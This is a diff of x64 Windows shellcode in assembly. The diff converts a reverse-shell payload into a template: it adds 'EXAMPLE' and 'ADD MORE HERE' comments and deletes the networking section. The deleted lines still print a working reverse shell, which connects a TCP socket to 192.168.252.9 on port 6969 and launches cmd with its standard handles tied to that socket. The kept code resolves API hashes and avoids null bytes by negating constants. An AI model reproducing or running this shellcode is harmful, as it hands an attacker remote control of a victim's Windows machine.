@@ -114,6 +114,7 @@ resolve_k32_sym_2:
     call qword ptr[rbp+0x8]             ; Call find function
     mov [rbp+0x20], rax                 ; Store TerminateProcess     
 
+; EXAMPLE LIBRARY TO LOAD
 load_ws2_32:
     mov rax, 0xffffffffffff9394         ; 'll x00 x00 x00 x00 x00 x00' (reversed and negated)
     neg rax
@@ -125,6 +126,7 @@ load_ws2_32:
     sub rsp, 40                         ; Create 40 bytes of room on the stack
     call [rbp+0x10]                     ; Call LoadLibraryA    
 
+; EXAMPLE SYMBOLS TO LOAD
 resolve_ws2_sym:
     mov rbx, rax                        ; RBX = Base Address of ws2_32.dll
     mov rax, 0xffffffff9f550614         ; Hash of connect (negated)
@@ -147,89 +149,8 @@ resolve_ws2_sym:
     dec al
     sub rsp, rax                        ; Make room for struct
 
-call_WSAStartup:
-    xor rcx,rcx
-    mov cx, 0x202                       ; RCX = WinSock Version 2.2
-    xor rdx, rdx
-    mov dx, 0x320                       ; RDX = Address of output WSAData structure
-    lea rdx, [rsp+rdx]
-    mov rax, 0xfffffffffffffdf8         ; Negate 520
-    neg rax
-    call [rbp+0x38]                     ; Call WSAStartup
+; ADD MORE HERE
 
-call_WSASocketA:                      
-    xor rcx, rcx
-    xor rdx, rdx
-    xor r8, r8
-    mov cl, 0x2                         ; Parameter af = 2 (AF_INET)             
-    inc rdx                             ; Parameter type = 1
-    add r8, 0x6                         ; Parameter protocol = 6 (TCP)
-    xor r9, r9                          ; Parameter lpProtocolInfo = 0
-    mov [rsp + 32], r9                  ; Parameter dwFlags = 0
-    mov [rsp + 40], r9                  ; Parameter g = 0
-    call [rbp+0x30]                     ; Call WSASocketA
-
-call_connect:
-    mov rsi, rax                        ; Save socket fd in RSI
-    mov rcx, rax                        ; RCX = Parameter s = socket fd created with WSSocketA
-    xor r8,r8
-    add r8, 16                          ; R8 = Parameter namelen = 16    
-    mov r9, 0xf603573fc6e4fffe
-    neg r9                              ; R9 = [IP = 192.168.252.9 | port = 0x391b = 6969 | AF_INET = 2]
-    mov rax, 0xfffffffffffffce0         ; Negated 800
-    neg rax
-    lea rdx, [rsp+rax]                  ; RDX = Parameter name = Address of struct sockaddr_in
-    mov [rdx], r9                       ; Write fields: sin_addr, sin_port, sin_family
-    xor r9, r9
-    mov [rdx + 8], r9                   ; Write field sin_zero
-    call [rbp+0x28]                     ; Call connect
-
-create_STARTUPINFOA:
-    mov rax, 0xfffffffffffffce0         ; Negated 800
-    neg rax
-    lea rdi, [rsp+rax]
-    sub rdi, 0xfffffffffffffd01         ; Negated 0x300
-    inc rdi
-    mov rbx, rdi
-    xor eax, eax
-    xor ecx, ecx
-    add cl, 0x20
-    rep stosd                           ; Zero-out 0x80 bytes
-    mov al, 0x68                        ; EAX = sizeof(_STARTUPINFO) = 0x68
-    mov [rbx], eax                      ; Field lpStartInfo.cb = sizeof(_STARTUPINFO) 
-    xor eax, eax
-    add al, 0xff
-    inc eax                             ; EAX = STARTF_USESTDHANDLES
-    mov [rbx + 0x3c], eax               ; Field lpStartupInfo.dwFlags = STARTF_USESTDHANDLES
-    mov [rbx + 0x50], rsi               ; Field lpStartupInfo.hStdInput = socket fd
-    mov [rbx + 0x58], rsi               ; Field lpStartupInfo.hStdOutput = socket fd
-    mov [rbx + 0x60], rsi               ; Field lpStartupInfo.hStdError = socket fd    
-
-call_CreateProccessA:
-    xor rcx, rcx                        ; Parameter lpApplicationName = 0 
-    mov rax, 0xfffffffffffffce0         ; Parameter lpCommandLine, 800
-    neg rax
-    lea rdx, [rsp+rax]
-    mov rax, 0xfffffffffffffe80         ; Negated 0x180
-    neg rax
-    add rdx, rax
-    xor rax, rax
-    mov rax, 0xffffffffff9b929d         ; EAX = "cmd", negated
-    neg rax
-    mov [rdx], rax                      ; Write "cmd" in the lpCommandLine parameter
-    xor r8, r8                          ; Parameter lpProcessAttributes = 0
-    xor r9, r9                          ; Parameter lpThreadAttributes = 0
-    xor rax, rax
-    inc eax
-    mov [rsp + 0x20], rax               ; Parameter bInheritHandles = 1
-    dec eax
-    mov [rsp + 0x28], rax               ; Parameter dwCreationFlags = 0
-    mov [rsp + 0x30], rax               ; Parameter lpEnvironment = 0
-    mov [rsp + 0x38], rax               ; Parameter lpCurrentDirectory = 0
-    mov [rsp + 0x40], rbx               ; Parameter lpStartupInfo = address of _STARTUPINFO
-    add rbx, 0x68
-    mov [rsp + 0x48], rbx               ; Parameter lpProcessInformation = output address, right after _STARTUPINFO
-    call [rbp+0x18]                     ; Call CreateProcessA  
 
 call_TerminateProcess:
     xor rcx, rcx
